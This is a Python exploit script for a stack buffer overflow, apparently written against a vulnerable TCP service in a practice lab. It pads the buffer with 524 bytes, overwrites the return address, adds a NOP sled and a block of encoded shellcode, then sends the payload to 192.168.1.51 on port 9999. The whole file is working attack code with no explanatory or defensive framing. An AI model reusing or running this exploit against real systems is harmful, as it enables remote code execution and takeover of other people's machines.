import sys, socket
from time import sleep

#   311712f3
#   f3121731
#   \xf3\x12\x17\x31

buffer = b"A" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 32

shellcode = (b"\xbe\x3f\xca\xa1\x60\xd9\xf7\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x52\x31\x70\x12\x83\xc0\x04\x03\x4f\xc4\x43\x95\x53"
b"\x30\x01\x56\xab\xc1\x66\xde\x4e\xf0\xa6\x84\x1b\xa3\x16"
b"\xce\x49\x48\xdc\x82\x79\xdb\x90\x0a\x8e\x6c\x1e\x6d\xa1"
b"\x6d\x33\x4d\xa0\xed\x4e\x82\x02\xcf\x80\xd7\x43\x08\xfc"
b"\x1a\x11\xc1\x8a\x89\x85\x66\xc6\x11\x2e\x34\xc6\x11\xd3"
b"\x8d\xe9\x30\x42\x85\xb3\x92\x65\x4a\xc8\x9a\x7d\x8f\xf5"
b"\x55\xf6\x7b\x81\x67\xde\xb5\x6a\xcb\x1f\x7a\x99\x15\x58"
b"\xbd\x42\x60\x90\xbd\xff\x73\x67\xbf\xdb\xf6\x73\x67\xaf"
b"\xa1\x5f\x99\x7c\x37\x14\x95\xc9\x33\x72\xba\xcc\x90\x09"
b"\xc6\x45\x17\xdd\x4e\x1d\x3c\xf9\x0b\xc5\x5d\x58\xf6\xa8"
b"\x62\xba\x59\x14\xc7\xb1\x74\x41\x7a\x98\x10\xa6\xb7\x22"
b"\xe1\xa0\xc0\x51\xd3\x6f\x7b\xfd\x5f\xe7\xa5\xfa\xa0\xd2"
b"\x12\x94\x5e\xdd\x62\xbd\xa4\x89\x32\xd5\x0d\xb2\xd8\x25"
b"\xb1\x67\x4e\x75\x1d\xd8\x2f\x25\xdd\x88\xc7\x2f\xd2\xf7"
b"\xf8\x50\x38\x90\x93\xab\xab\x5f\xcb\xb2\x05\x08\x0e\xb4"
b"\x47\xa9\x87\x52\x1d\x39\xce\xcd\x8a\xa0\x4b\x85\x2b\x2c"
b"\x46\xe0\x6c\xa6\x65\x15\x22\x4f\x03\x05\xd3\xbf\x5e\x77"
b"\x72\xbf\x74\x1f\x18\x52\x13\xdf\x57\x4f\x8c\x88\x30\xa1"
b"\xc5\x5c\xad\x98\x7f\x42\x2c\x7c\x47\xc6\xeb\xbd\x46\xc7"
b"\x7e\xf9\x6c\xd7\x46\x02\x29\x83\x16\x55\xe7\x7d\xd1\x0f"
b"\x49\xd7\x8b\xfc\x03\xbf\x4a\xcf\x93\xb9\x52\x1a\x62\x25"
b"\xe2\xf3\x33\x5a\xcb\x93\xb3\x23\x31\x04\x3b\xfe\xf1\x34"
b"\x76\xa2\x50\xdd\xdf\x37\xe1\x80\xdf\xe2\x26\xbd\x63\x06"
b"\xd7\x3a\x7b\x63\xd2\x07\x3b\x98\xae\x18\xae\x9e\x1d\x18"
b"\xfb")

print("[+] Sending the payload...")
payload = buffer + shellcode + b'\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.51',9999))
s.send(payload)
s.close()
sleep(1)
